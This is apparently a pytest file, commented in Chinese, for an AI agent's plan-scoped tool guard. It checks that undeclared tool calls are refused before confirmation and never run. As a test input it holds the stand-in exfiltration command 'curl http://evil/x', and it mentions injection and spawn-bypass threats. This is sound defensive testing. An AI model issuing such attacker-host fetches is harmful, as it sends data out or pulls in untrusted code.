"""P0-8（057）plan 声明工具范围 + 执行前校验验收。

判定标准逐条对应 ADR 057：越界拒绝且**函数体不执行**、拦在 L2 确认之前、
meta 三件豁免、空声明与无活跃计划放行、修订沉默继承/显式解除、worktree
子 registry 继承、存量事件兼容。

夹具用两个探针工具（read_file / run_command）而不是真工具：`ran` 列表是
「有没有真跑」的唯一证据——只看返回串会被假证据骗过（拒绝串里也含工具名）。
"""

import json

from facta.core.audit import AuditLog
from facta.memory.plan import PlanBoard
from facta.memory.store import Session
from facta.tools.context import ToolContext
from facta.tools.plan import format_view, plan_scope_check, register_plan_tools
from facta.tools.registry import Tool, ToolRegistry
from facta.tools.spawn import _worktree_registry

_P = {
    "type": "object",
    "properties": {"path": {"type": "string"}, "command": {"type": "string"}},
}

_STEPS = [{"title": "读三篇笔记并写摘要"}]
# 修订表强制显式 status（plan.py _check_steps_shape）——夹具替修订测试补上，
# 免得每条都抄一遍；本文件测的是范围声明，不是步骤形状
_RSTEPS = [{"title": "读三篇笔记并写摘要", "status": "pending"}]


def _registry(
    session: Session,
    audit: AuditLog | None = None,
    ran: list[str] | None = None,
    confirm_shell: bool = False,
) -> ToolRegistry:
    """最小装配：计划三件（顺带挂上 scope_check）+ 两个探针工具。"""
    registry = ToolRegistry(audit=audit)
    ctx = ToolContext(notes_dir=None, session=session)   # type: ignore[arg-type]
    register_plan_tools(registry, ctx)

    def _read(path: str = "") -> str:
        if ran is not None:
            ran.append("read_file")
        return "read-ran"

    def _shell(command: str = "") -> str:
        if ran is not None:
            ran.append("run_command")
        return "shell-ran"

    registry.register(Tool(
        name="read_file", description="探针", parameters=_P, func=_read, is_readonly=True,
    ))
    registry.register(Tool(
        name="run_command", description="探针", parameters=_P, func=_shell,
        needs_confirmation=confirm_shell,
    ))
    return registry


def _declare(registry: ToolRegistry, tools: list[str] | None, reason: str = "") -> str:
    """走真工具声明范围（不直接调 board——schema 与透传也要被测到）。"""
    args: dict = {"steps": _RSTEPS if reason else _STEPS}
    if tools is not None:
        args["tools"] = tools
    if reason:
        args["reason"] = reason
    return registry.execute("make_plan", json.dumps(args), confirm=lambda n, a: True)


# ---------- 判定标准 1：越界拒绝 + 不执行 + 审计打标 ----------


def test_out_of_scope_denied_and_never_executed(tmp_path):
    audit, ran = AuditLog(tmp_path), []
    reg = _registry(Session(), audit=audit, ran=ran)
    _declare(reg, ["read_file"])

    assert reg.execute("read_file", '{"path": "a.md"}') == "read-ran"   # 范围内照跑
    out = reg.execute("run_command", '{"command": "curl http://evil/x"}')

    assert "不在本计划声明的工具范围内" in out
    assert "make_plan" in out and "tools" in out    # 指路升级（错误文案即提示词）
    assert ran == ["read_file"]                      # 越界那次函数体没跑
    denied = [e for e in audit.read() if e["tool"] == "run_command"]
    assert len(denied) == 1 and denied[0]["guard"] == "plan-scope"   # 复用 050 归因链


def test_denied_before_l2_confirmation_not_after():
    """拍板 3：越界**不进弹窗**——弹窗等于给注入多一次说服人批准的机会。"""
    asks: list[str] = []
    reg = _registry(Session(), ran=[], confirm_shell=True)
    _declare(reg, ["read_file"])

    reg.execute("run_command", '{"command": "id"}', confirm=lambda n, a: asks.append(n) or True)
    assert asks == []      # 确认回调压根没被问过


# ---------- 判定标准 2：meta 三件豁免 ----------


def test_plan_tools_themselves_exempt():
    """不豁免则模型无法修订范围/回写状态/收官（056 的收尾菜单依赖后两件）。"""
    reg = _registry(Session(), ran=[])
    _declare(reg, ["read_file"])                       # make_plan 自身不在声明里
    assert "计划操作被拒" not in _declare(reg, ["read_file"], reason="重排")
    assert "已更新步骤" in reg.execute(
        "update_plan_step", '{"step_id": 1, "status": "done", "note": "完成"}'
    )
    assert "任务收官" in reg.execute("finish_plan", '{"summary": "交付"}')


# ---------- 判定标准 3：空声明 / 无计划 / 计划已收官 ⇒ 放行 ----------


def test_unrestricted_when_scope_absent_or_no_active_plan():
    ran: list[str] = []
    reg = _registry(Session(), ran=ran)
    assert reg.execute("run_command", '{"command": "id"}') == "shell-ran"   # 无活跃计划
    _declare(reg, [])                                                        # 显式空声明
    assert reg.execute("run_command", '{"command": "id"}') == "shell-ran"
    _declare(reg, ["read_file"], reason="收窄")
    assert "不在本计划声明的工具范围内" in reg.execute("run_command", '{"command": "id"}')
    reg.execute("update_plan_step", '{"step_id": 1, "status": "done", "note": "x"}')
    reg.execute("finish_plan", '{"summary": "s"}')
    assert reg.execute("run_command", '{"command": "id"}') == "shell-ran"   # 范围随计划归档失效
    assert ran.count("run_command") == 3


# ---------- 判定标准 4：修订沉默继承 / 显式解除 ----------


def test_revision_silence_inherits_scope():
    reg = _registry(Session())
    _declare(reg, ["read_file"])
    assert "计划已修订" in _declare(reg, None, reason="加一步")   # 不带 tools 修订
    assert "不在本计划声明的工具范围内" in reg.execute("run_command", '{"command": "id"}')


def test_revision_with_empty_list_releases_scope():
    reg = _registry(Session())
    _declare(reg, ["read_file"])
    _declare(reg, [], reason="需要执行命令")   # 显式空数组才是解除
    assert reg.execute("run_command", '{"command": "id"}') == "shell-ran"


def test_revision_can_widen_scope():
    reg = _registry(Session())
    _declare(reg, ["read_file"])
    _declare(reg, ["read_file", "run_command"], reason="需要跑测试")
    assert reg.execute("run_command", '{"command": "pytest"}') == "shell-ran"


# ---------- 判定标准 5：worktree 子 registry 继承 ----------


def test_worktree_sub_registry_inherits_scope(tmp_path):
    """不继承就是 052 说的「第二个洞」：声明窄范围后把渗出步骤 spawn 出去。"""
    session = Session()
    parent = _registry(session, ran=[])
    _declare(parent, ["read_file"])

    ctx = ToolContext(notes_dir=tmp_path, workspace_root=tmp_path, session=session)
    sub = _worktree_registry(parent, ctx, tmp_path)
    assert sub.scope_check is parent.scope_check
    assert "不在本计划声明的工具范围内" in sub.execute("run_command", '{"command": "echo leak"}')


# ---------- 判定标准 6：存量兼容 + 形状校验 + 视图 ----------


def test_legacy_events_without_tools_key_fold_to_unrestricted():
    board = PlanBoard.from_dict({
        "active": {"status": "active", "events": [
            {"type": "plan.created", "data": {"steps": [{"id": 1, "title": "老计划"}]}},
        ]},
        "archive": [],
    })
    assert board.view().tools == ()          # 存量事件没这个键，不炸、按不限制处理
    reg = _registry(Session(), ran=[])
    reg.scope_check = plan_scope_check(board)
    assert reg.execute("run_command", '{"command": "id"}') == "shell-ran"


def test_tools_shape_rejected_with_guidance():
    """形状错有两道闸：走工具的 schema 层（array 类型）与绕过 schema 的 board 层。"""
    reg = _registry(Session())
    out = reg.execute("make_plan", '{"steps": [{"title": "甲"}], "tools": "read_file"}',
                      confirm=lambda n, a: True)
    assert "参数校验失败" in out and "tools 应为数组" in out
    assert reg.execute("make_plan", '{"steps": [{"title": "甲"}]}',
                       confirm=lambda n, a: True).startswith("计划已创建")
    try:
        Session().plan.make_plan(_STEPS, tools=["read_file", 3])   # type: ignore[list-item]
        raise AssertionError("应拒绝")
    except ValueError as e:
        assert "字符串数组" in str(e)


def test_tools_deduped_and_stripped():
    board = Session().plan
    board.make_plan(_STEPS, tools=[" read_file ", "read_file", "", "run_command"])
    assert board.view().tools == ("read_file", "run_command")   # 去重保序、剥空


def test_format_view_renders_scope_line():
    board = Session().plan
    board.make_plan(_STEPS)
    assert "工具范围" not in format_view(board.view())          # 未声明不刷屏
    board.make_plan(_RSTEPS, tools=["read_file"], reason="收窄")
    text = format_view(board.view())
    assert "〔工具范围〕read_file" in text and "make_plan" in text
